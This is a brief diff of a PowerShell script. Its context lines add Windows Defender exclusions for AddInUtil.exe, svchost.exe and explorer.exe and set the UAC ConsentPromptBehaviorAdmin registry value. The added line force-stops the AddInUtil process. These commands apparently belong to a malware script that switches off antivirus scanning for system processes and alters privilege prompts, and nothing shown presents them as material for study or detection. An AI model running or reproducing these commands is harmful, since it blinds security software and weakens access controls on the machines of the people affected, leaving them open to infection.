@@ -5,6 +5,7 @@ Add-MpPreference -ExclusionProcess "AddInUtil.exe";
 Add-MpPreference -ExclusionProcess "svchost.exe";
 Add-MpPreference -ExclusionProcess "explorer.exe";
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 5;
+Stop-Process -Name "AddInUtil" -Force
 
 ping google.com
 
